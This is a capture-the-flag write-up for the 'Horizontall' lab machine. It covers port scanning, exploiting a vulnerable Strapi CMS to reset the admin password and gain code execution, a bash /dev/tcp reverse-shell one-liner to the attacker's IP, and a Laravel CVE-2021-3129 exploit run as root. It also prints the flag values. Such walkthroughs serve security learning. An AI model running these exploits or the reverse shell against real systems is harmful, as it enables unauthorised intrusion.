# Horizontall

The first thing is to scan the host

```console
$ nmap -sC -sV -vv -oA quick 10.10.11.105
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-11 21:21 CET
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:21
Completed NSE at 21:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:21
Completed NSE at 21:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:21
Completed NSE at 21:21, 0.00s elapsed
Initiating Ping Scan at 21:21
Scanning 10.10.11.105 [2 ports]
Completed Ping Scan at 21:21, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:21
Completed Parallel DNS resolution of 1 host. at 21:21, 0.02s elapsed
Initiating Connect Scan at 21:21
Scanning 10.10.11.105 [1000 ports]
Discovered open port 80/tcp on 10.10.11.105
Discovered open port 22/tcp on 10.10.11.105
Completed Connect Scan at 21:21, 14.64s elapsed (1000 total ports)
Initiating Service scan at 21:21
Scanning 2 services on 10.10.11.105
Completed Service scan at 21:22, 6.19s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.105.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:22
Completed NSE at 21:22, 3.14s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:22
Completed NSE at 21:22, 0.70s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:22
Completed NSE at 21:22, 0.00s elapsed
Nmap scan report for 10.10.11.105
Host is up, received syn-ack (0.11s latency).
Scanned at 2021-11-11 21:21:42 CET for 25s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmINBJNsYC8F7jN0=
|   256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:22
Completed NSE at 21:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:22
Completed NSE at 21:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:22
Completed NSE at 21:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.10 seconds
```

2 ports are open

Let's analyze the port `80`

We got e redirect to `horizontall.htb`, so we need to add this ip-host combination to the `/etc/hosts` file 

![](1.bmp)

In the webpage we can't file anything usefull, let's try to visit the `robots.txt` file, 404...

Maybe dirbuster can give us some better result...nothing

Let's return to the source code

In the `app.c68eb462.js` we found the subdomain `api-prod.horizontall.htb`, let's add this to the hosts file and search for something usefull

```
10.10.11.105    api-prod.horizontall.htb
10.10.11.105    horizontall.htb
```

With dirbuster we found the `http://api-prod.horizontall.htb/admin/auth/login` page

![](2.png)

First things to try `sqlmap`...nothing

From `http://api-prod.horizontall.htb/admin/init` we found the strapi version

```
{"data":{"uuid":"a55da3bd-9693-4a08-9279-f9df57fd1817","currentEnvironment":"development","autoReload":false,"strapiVersion":"3.0.0-beta.17.4"}}
```

This version of strapi seem vulnerable to a RCE ([CVE-2019-18818, CVE-2019-19609](https://www.exploit-db.com/exploits/50239))

```
$ python poc.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM2NjcwNTk4LCJleHAiOjE2MzkyNjI1OTh9.xiterdpePPCl3wIZB5A_5BZTfs-KVz9-tY1shMhWxUM
```

Now we can spawn a reverse shell

```
$> bash -c 'bash -i >& /dev/tcp/10.10.16.69/4242 0>&1'
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
```

```console
$ sudo nc -nlvp 4242
Listening on 0.0.0.0 4242
Connection received on 10.10.11.105 33226
bash: cannot set terminal process group (1889): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:/home/developer$ cat user.txt
cat user.txt
4635b65b9e023728503fd6516a7aeebe
```

#### **USER OWN >>** `4635b65b9e023728503fd6516a7aeebe`

We can now create a private key and use that to login from a "real ssh session" (it becomes more easy to navigate with autocomplete enabled)

Next step, own the system

Let' start to analyze what other services we have (in the strapi interface we saw some redirect to `localhost:1337`)

```console
strapi@horizontall:~$ netstat -tunlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1862/node /usr/bin/
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

We have 3 ports accessible only from localhost, let's try to forward to our local machine and see what services are

### Port 8000

```console
$ ssh strapi@horizontall -i horizontall -L 8000:127.0.0.1:8000
```

![](3.png)

### Port 1337

```console
$ ssh strapi@horizontall -i horizontall -L 1337:127.0.0.1:1337
```

![](4.png)

### Port 3306

```console
$ ssh strapi@horizontall -i horizontall -L 3306:127.0.0.1:3306
```

A `MySQL` server
```
[���
5.7.35-0ubuntu0.18.04.1����\"ap �яя�яБ����������}t^t4~�mysql_native_password�!��я„#08S01Got packets out of order
```

Lavarel seems vulnerable (CVE-2021-3129)

After some exploit [this](https://github.com/nth347/CVE-2021-3129_exploit) seems functional

```console
$ python exploit.py http://localhost:8000 Monolog/RCE1 id
[i] Trying to clear logs
[+] Logs cleared
[i] PHPGGC not found. Cloning it
Cloning into 'phpggc'...
remote: Enumerating objects: 2673, done.
remote: Counting objects: 100% (1015/1015), done.
remote: Compressing objects: 100% (576/576), done.
remote: Total 2673 (delta 414), reused 883 (delta 308), pack-reused 1658
Receiving objects: 100% (2673/2673), 400.37 KiB | 2.57 MiB/s, done.
Resolving deltas: 100% (1056/1056), done.
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=0(root) gid=0(root) groups=0(root)

[i] Trying to clear logs
[+] Logs cleared


$ python exploit.py http://localhost:8000 Monolog/RCE1 ls
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

favicon.ico
index.php
robots.txt
web.config

[i] Trying to clear logs
[+] Logs cleared


$ python exploit.py http://localhost:8000 Monolog/RCE1 "ls /root"
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

boot.sh
pid
restart.sh
root.txt

[i] Trying to clear logs
[+] Logs cleared


$ python exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

bee2421fa91500a633b73d6ff3b2c864

[i] Trying to clear logs
[+] Logs cleared
```

#### **SYSTEM OWN >>** `bee2421fa91500a633b73d6ff3b2c864`